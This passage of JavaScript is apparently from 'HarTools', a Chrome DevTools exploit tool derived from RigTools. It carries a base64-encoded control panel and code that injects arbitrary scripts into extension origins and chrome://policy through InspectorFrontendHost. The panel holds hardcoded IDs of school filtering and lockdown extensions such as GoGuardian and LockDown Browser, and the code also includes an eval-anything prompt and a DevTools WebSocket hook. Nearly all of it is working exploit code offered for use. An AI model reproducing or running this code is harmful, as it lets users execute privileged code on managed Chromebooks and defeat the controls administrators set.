                // }, 5000);

            }
            document.open();
            document.write(atob(`CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CiAgPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCIgLz4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIiAvPgogICAgPHRpdGxlPkhhclRvb2xzPC90aXRsZT4KICAgIDxzdHlsZT4KICAgICAgQGltcG9ydCB1cmwoJ2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzMj9mYW1pbHk9R2Vpc3Q6aXRhbCxvcHN6LHdnaHRAMCwxNC4uMzIsMTAwLi45MDA7MSwxNC4uMzIsMTAwLi45MDAmZGlzcGxheT1zd2FwJyk7CgogICAgICBpZnJhbWUgewogICAgICAgIG9wYWNpdHk6IDA7CiAgICAgICAgd2lkdGg6IDA7CiAgICAgICAgaGVpZ2h0OiAwOwogICAgICB9CgogICAgICBib2R5IHsKICAgICAgICBmb250LWZhbWlseTogJ0dlaXN0Jywgc2Fucy1zZXJpZjsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwOwogICAgICAgIGNvbG9yOiAjOGEyYmUyOwogICAgICAgIG1hcmdpbjogMDsKICAgICAgICBwYWRkaW5nOiAxNXB4OwogICAgICAgIG92ZXJmbG93OiBoaWRkZW47CiAgICAgIH0KCiAgICAgIC5iYWNrZ3JvdW5kLWdyaWQgewogICAgICAgIHBvc2l0aW9uOiBmaXhlZDsKICAgICAgICB0b3A6IDA7CiAgICAgICAgbGVmdDogMDsKICAgICAgICByaWdodDogMDsKICAgICAgICBib3R0b206IDA7CiAgICAgICAgYmFja2dyb3VuZC1pbWFnZTogcmFkaWFsLWdyYWRpZW50KCMzMzMgMXB4LCB0cmFuc3BhcmVudCAxcHgpOwogICAgICAgIGJhY2tncm91bmQtc2l6ZTogMnJlbSAycmVtOwogICAgICAgIHotaW5kZXg6IC0xOwogICAgICAgIGFuaW1hdGlvbjogbW92ZUdyaWQgNHMgbGluZWFyIGluZmluaXRlOwogICAgICAgIHRyYW5zaXRpb246IGJhY2tncm91bmQtcG9zaXRpb24teCA0MDBtczsKICAgICAgfQoKICAgICAgQGtleWZyYW1lcyBtb3ZlR3JpZCB7CiAgICAgICAgMCUgewogICAgICAgICAgYmFja2dyb3VuZC1wb3NpdGlvbjogMCAwOwogICAgICAgIH0KCiAgICAgICAgMTAwJSB7CiAgICAgICAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uOiAycmVtIDJyZW07CiAgICAgICAgfQogICAgICB9CgogICAgICAuYmFja2dyb3VuZC1ncmlkOmhvdmVyIHsKICAgICAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uLXg6IDJyZW07CiAgICAgIH0KCiAgICAgIGEgewogICAgICAgIGNvbG9yOiAjOGEyYmUyOwogICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICAgICAgfQoKICAgICAgYTpob3ZlciB7CiAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgICB9CgogICAgICAubWFpbiB7CiAgICAgICAgdG9wOiA1MCU7CiAgICAgICAgbGVmdDogNTAlOwogICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlLCAtNTAlKTsKICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjMWQxZDFkOwogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgIHBhZGRpbmc6IDMwcHg7CiAgICAgICAgYm9yZGVyLXJhZGl1czogOHB4OwogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwOwogICAgICAgIG1heC1oZWlnaHQ6IDkwdmg7CiAgICAgICAgb3ZlcmZsb3cteTogYXV0bzsKICAgICAgICB3aWR0aDogNzUlOwogICAgICB9CgogICAgICAuaGVhZGVyIHsKICAgICAgICBkaXNwbGF5OiBmbGV4OwogICAgICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47CiAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsKICAgICAgICBtYXJnaW4tYm90dG9tOiAyMHB4OwogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgfQoKICAgICAgLmxvZ28gewogICAgICAgIHdpZHRoOiAzLjVlbTsKICAgICAgICBoZWlnaHQ6IGF1dG87CiAgICAgICAgbWFyZ2luLWJvdHRvbTogMTBweDsKICAgICAgfQoKICAgICAgLnRpdGxlLXRleHQgewogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgfQoKICAgICAgaDEgewogICAgICAgIGZvbnQtc2l6ZTogMi4yZW07CiAgICAgICAgbWFyZ2luOiAwOwogICAgICAgIGNvbG9yOiAjOGEyYmUyOwogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICB9CgogICAgICAuYnV0dG9uIHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjOGEyYmUyOwogICAgICAgIGNvbG9yOiBibGFjazsKICAgICAgICBwYWRkaW5nOiA4cHggMTJweDsKICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOwogICAgICAgIGZvbnQtc2l6ZTogMTRweDsKICAgICAgICBtYXJnaW46IDVweDsKICAgICAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICAgICAgYm9yZGVyLXJhZGl1czogNnB4OwogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgIHRyYW5zaXRpb246IGFsbCAwLjNzIGVhc2U7CiAgICAgIH0KCiAgICAgIC5idXR0b246aG92ZXIgewogICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNlMmUyZTI7CiAgICAgICAgdHJhbnNmb3JtOiBzY2FsZSgxLjEpOwogICAgICB9CgogICAgICAuYnV0dG9uOmZvY3VzIHsKICAgICAgICBvdXRsaW5lOiBub25lOwogICAgICB9CgogICAgICBpbnB1dCwKICAgICAgc2VsZWN0LAogICAgICB0ZXh0YXJlYSB7CiAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzEyMTIxMjsKICAgICAgICBjb2xvcjogd2hpdGU7CiAgICAgICAgYm9yZGVyOiAxcHggc29saWQgIzMzMzsKICAgICAgICBwYWRkaW5nOiAxMHB4OwogICAgICAgIGJvcmRlci1yYWRpdXM6IDRweDsKICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICBtYXJnaW4tYm90dG9tOiAxNXB4OwogICAgICB9CgogICAgICBpbnB1dDpmb2N1cywKICAgICAgc2VsZWN0OmZvY3VzLAogICAgICB0ZXh0YXJlYTpmb2N1cyB7CiAgICAgICAgb3V0bGluZTogbm9uZTsKICAgICAgICBib3JkZXItY29sb3I6ICNhODEyZmY7CiAgICAgIH0KCiAgICAgIDo6cGxhY2Vob2xkZXIgewogICAgICAgIGNvbG9yOiAjYmJiOwogICAgICB9CiAgICA8L3N0eWxlPgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDxkaXYgY2xhc3M9ImJhY2tncm91bmQtZ3JpZCI+PC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJtYWluIj4KICAgICAgPGRpdiBjbGFzcz0iaGVhZGVyIj4KICAgICAgICA8aW1nIHNyYz0iaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nyb3NzamJseS9IYXJUb29scy1yaWd0b29sczEyOHBsdXMvcmVmcy9oZWFkcy9tYWluL2hhcnRvb2xzLmdpZiIgYWx0PSJIYXJUb29scyBMb2dvIiBjbGFzcz0ibG9nbyIgLz4KICAgICAgICA8ZGl2IGNsYXNzPSJ0aXRsZS10ZXh0Ij4KICAgICAgICAgIDxoMT5IYXJUb29sczwvaDE+CiAgICAgICAgICA8cD5EZXZlbG9wZXIgVG9vbHMgYW5kIEV4dGVuc2lvbiBDb2RlIGV4ZWN1dGlvbjwvcD4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CgogICAgICA8cD5UaGlzIHdhcyBmb3VuZCBieSA8YSBocmVmPSJodHRwczovL2Nyb3NzamJseS5wYWdlcy5kZXYvIj5jcm9zc2pibHk8L2E+PGJyPk9yaWdpbmFsIFJpZ1Rvb2xzIEV4cGxvaXQgd2FzIGZvdW5kIGJ5IDxhIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS9GV1NtYXNoZXIiPkZXU21hc2hlcjwvYT48L3A+CiAgICAgIDxocj4KICAgICAgPHA+QUtBOiBpZiBzb21lb25lIHRlbGxzIHlvdSB0aGF0IHRoZXkgbWFkZSB0aGlzLCB0aGV5J3JlIGx5aW5nIGFuZCB5b3Ugc2hvdWxkIGxhdWdoIGF0IHRoZW08L3A+CiAgICAgIDxocj4KICAgICAgPHA+QWRkaXRpb25hbCBjcmVkaXRzOiBEaXNjb3JkOiBAYXhxbXggKHRlc3RpbmcgYW5kIGhlbHBpbmcgd2l0aCBkZXZlbG9wbWVudCkgQHB3ZW4gKGlkZWFzKSB8IEdpdGh1YjogPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL0ZXU21hc2hlciI+RldTbWFzaGVyPC9hPiAob3JpZ2luYWwgcmlndG9vbHMgZXhwbG9pdCkgPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL0Jsb2JieS1Cb2kiPkJsb2JieSBCb2k8L2E+ICh0ZXN0aW5nIGFuZCBkZXZlbG9wbWVudCk8L3A+CiAgICAgIDxocj4KCiAgICAgIDxwPlByZXNzIFEgZm9yIGV2YWx1YXRpbmcgY29kZSB1bmRlciA8YSBjbGFzcz0iYnV0dG9uIiBpZD0iZXh0ZGJnIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmV4dGVuc2lvbiBpZDwvYT48L3A+CiAgICAgIDxwPk9yIHByZXNzIDEtOSBmb3Igc29tZSBoYXJkY29kZWQgZXh0ZW5zaW9uczwvcD4KICAgICAgPHA+CiAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0iYWRrY3BrcGdoYWhtYm9wa2pjaG9iaWVja2VvYW9lZW0iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+bHMgZmlsdGVyPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9Imhwa2Rva2FramdscHBlZWtmZWVrbWViZmFoYWRuZmxwIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmxzIGFsZXJ0PC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9ImhhbGRsZ2xkcGxnbmdna2phYWZoZWxnaWFnbGFmYW5oIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmdvZ3VhcmRpYW48L2E+CiAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0ibW9laGtiYmNia2xta2NqaWJjYmJvb2ViZ3BvZ2Vqb2MiIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+YXJpc3RvdGxlPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9ImttZmZlaGJpZGxhbGliZmVrbGFlZm5ja3BpZGJvZGZmIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmlib3NzPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9Im1sb2FqZm5tamNrZmpiZWVvZmNkYWVjYmVsbmJsZGVuIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPnNuYXAmcmVhZDwvYT4KICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJmb2dqZWFuamZiaW9tYmdobm1rbW1vcGhmZWNjamRraSIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5sb2NrZG93biBicm93c2VyPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9ImttcGpsaWxuZW1qY2lvaGpja2phZG1nbWljb2xkZ2xmIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmR5a25vdyBjbG91ZDwvYT4KICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJnbmRtaGRjZWZiaGxjaGtoaXBjbm5ia2NtaWNuY2VoayIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5nZm9ybXMgbG9ja2VkIG1vZGUgKGVucm9sbGVkIGNicyk8L2E+CiAgICAgIDwvcD4KCiAgICAgIDxwPlByZXNzIE0gZm9yIGV2YWx1YXRpbmcgdW5kZXIgPGEgY2xhc3M9ImJ1dHRvbiIgaWQ9ImRldmRiZyIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5kZXZ0b29sczwvYT4gY29udGV4dDwvcD4KICAgICAgPHA+VHlwaW5nIGNhbmNlbCBpbiBhbnkgcHJvbXB0IHdpbGwgY2FuY2VsIHRoZSBjdXJyZW50IG9wZXJhdGlvbi48L3A+CgogICAgICA8YSBjbGFzcz0iYnV0dG9uIiBocmVmPSJkZXZ0b29sczovL2RldnRvb2xzL2J1bmRsZWQvZGV2dG9vbHNfYXBwLmh0bWw/ZXhwZXJpbWVudHM9dHJ1ZSZ3cz0lJXVwZGF0ZXJ1cmwlJSI+UmUtb3BlbiBkZXZ0b29sczwvYT4KICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBpZD0idXBkYXRlciI+VXBkYXRlIHBheWxvYWQ8L2E+CiAgICAgIDxhIGNsYXNzPSJidXR0b24iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSIgaWQ9ImNsZWFudXAiPkNsZWFudXAgYW5kIHJlc2V0IGZvciBleHRlbnNpb248L2E+CiAgICAgIDxhIGNsYXNzPSJidXR0b24iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSIgaWQ9ImFjdGl2YXRlIj5DaHJvbWUgVVJMczwvYT4KICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBpZD0iYWN0aXZhdGUyIj5DaHJvbWUgVVJMcyAyPC9hPgogICAgPC9kaXY+CgogICAgPHNjcmlwdCBkZWZlcj4KICAgICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgICAgICAgaWYgKGV2ZW50LmtleSA9PT0gInEiKSB7CiAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZXh0ZGJnIikuY2xpY2soKTsKICAgICAgICB9IGVsc2UgaWYgKGV2ZW50LmtleSA9PT0gIm0iKSB7CiAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZGV2ZGJnIikuY2xpY2soKTsKICAgICAgICB9IGVsc2UgaWYgKFsiMSIsICIyIiwgIjMiLCAiNCIsICI1IiwgIjYiLCAiNyIsICI4IiwgIjkiXS5pbmNsdWRlcyhldmVudC5rZXkpKSB7CiAgICAgICAgICBjb25zb2xlLmxvZyhldmVudC5rZXkpOwogICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcihgcCAuaGFyZGNvZGVkOm50aC1jaGlsZCgke3BhcnNlSW50KGV2ZW50LmtleSl9KWApLmNsaWNrKCk7CiAgICAgICAgfQogICAgICB9KTsKICAgIDwvc2NyaXB0PgogIDwvYm9keT4KPC9odG1sPg==`));
            document.querySelector('#activate').onclick = function () {
                dbgext(false, pdfId);
            }
            onunload = function () {
                while (true);
            }
            document.close();
            document.title = "Dashboard";
            document.querySelector('#activate2').onclick = function (ev) {

                function xd(w) {
                    w.close();
                    const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                    const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                    chrome.tabs.getCurrent(function (tab) {
                        console.log(tab);
                        chrome.windows.create({ url: mojoURL, setSelfAsOpener: true }, function (info) {
                            async function createAndWriteFile() {
                                function writeFile(filename, content) {
                                    return new Promise((resolve) => {
                                        webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function (fs) {
                                            fs.root.getFile(filename, { create: true }, function (entry) {
                                                entry.remove(function () {
                                                    fs.root.getFile(filename, { create: true }, function (entry) {
                                                        entry.createWriter(function (writer) {
                                                            writer.write(new Blob([content]))
                                                            writer.onwriteend = function () {
                                                                resolve(entry.toURL());
                                                            }
                                                        })
                                                    })
                                                })
                                            })
                                        })
                                    })

                                }
                                const htmlFile = `<html>
                                <head></head><body><iframe src="filesystem:chrome://extensions/temporary/nothing.html"></iframe>
                                </html>
                                <script>
                                onerror=  alert;
                                if (top !== window) {
                                    top.location.replace(location.href);
                                };
                                </script>
                                `
                                
                                // alert(url);
                                opener.postMessage({ url: (await writeFile('index.html', htmlFile))}, '*');
                                setTimeout(function () {
                                    close();
                                }, 800);
                            }
                            chrome.tabs.executeScript(info.tabs[0].id, { code: `(${createAndWriteFile.toString()})()` });
                            function m2(url) {
                                // alert(url);
                                onmessage = function (data) {
                                    if (data.data.type === "ack") {
                                        
                                        // chrome.tabs.getCurrent(function (tab) {
                                            // alert("navigating");
                                            top.location.replace("")
                                        // })
                                    }
                                }
                                top.postMessage({ type: 'acc' }, '*');
                            }
                            onmessage = function (dat) {
                                if (dat.data.url) {
                                    m2(dat.data.url);
                                }
                            };
                        })
                    })

                }
                dbgext(false, pdfId, xd.toString());
            }
            onmessage = function (ev) {
                if (ev.data.type === "browserInitNavigate") {
                    alert(1);
                    ev.source.location.replace(ev.data.url);
                }
            }
            document.querySelector('#updater').onclick = function (ev) {
                onunload = null;
                const ws = new WebSocket("ws://%%updaterurl%%");

                ws.onopen = function () {
                    ws.onmessage = function (ev) {
                        const received = JSON.parse(ev.data);
                        const savedURL = received.params.request.url;
                        ws.close();
                        const w = open('', '_blank');
                        console.log(savedURL);
                        w.eval(`setTimeout(function () {opener.open(atob("${btoa(savedURL)}"), '_blank'); window.close()}, 500);`);
                        setTimeout(() => { location.reload() });
                    }
                    ws.send(JSON.stringify({
                        method: "Target.setDiscoverTargets",
                        id: 999,
                        params: {}
                    }));
                }

            }
            onmessage = function (d) {
                if (d.data.type === "acc") {
                    onunload = function () { while (true); };
                    d.source.postMessage({ type: "ack" }, '*');
                    
                };

                if (!globalMap[d.data.uid]) return;

                for (const frame of globalMap) {
                    if (!frame) continue;
                    if (frame.idx === d.data.uid) {
                        frame.remove();
                        delete globalMap[globalMap.indexOf(frame)];
                        return;
                    }
                }
            }
            function dbgext(cleanup, id, payload) {
                let x = id;
                while (!x) {
                    x = prompt('Extension id?');
                    if (x === "cancel") {
                        return;
                    }
                }
                let path = '//manifest.json';
                let is_pdf = false;
                let injected = payload ?? payload_swamp.toString();
                if (x === pdfId) {
                    path = "index.html"; // pdf viewer hack
                    is_pdf = true;
                    const b = prompt("code to execute!");
                    if (!b) return;
                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');
                    
                }
                const URL_1 = `chrome-extension://${x ??
                    alert("NOTREACHED")}/${path}`;
                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
                const ifr = document.createElement("iframe");
                ifr.src = URL_1;
                document.body.appendChild(ifr);
                const ifrid = globalMap.push(ifr) - 1;
                ifr.idx = ifrid;
                ifr.onload = function () {

                    ifr.contentWindow.postMessage({
                        type: "uidpass", passcode:
                            ifrid,
                        cleanup: cleanup
                    }, '*');
                    // console.log('hi');
                }
                // alert(1);

            }
            document.querySelector('#extdbg').onclick = function () {
                dbgext(false);
            }
            document.querySelectorAll('.hardcoded').forEach(el => {el.onclick = function () {
                let extid = el.getAttribute("ext");
                console.log(el.innerText, extid);
                dbgext(false, extid);
                }
            });
            document.querySelector('#cleanup').onclick = function () {
                dbgext(true);
            }
            document.querySelector('#devdbg').onclick = function () {
                var l_canceled = false;
                const id = setTimeout(function m() {
                    if (l_canceled) return;
                    (new Function(prompt("Evaluate script! (type 'cancel' to cancel)")))();
                    if (!l_canceled) setTimeout(m, 0);
                    clearTimeout(id);
                });
                Object.defineProperty(window, 'cancel', {
                    get: function () {
                        l_canceled = true;
                    }, configurable: true
                })
                return;
            }
            console.log(globalMap);
        }
        w.eval(`(${ui.toString()})()`);
        window.close();

    }

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
})
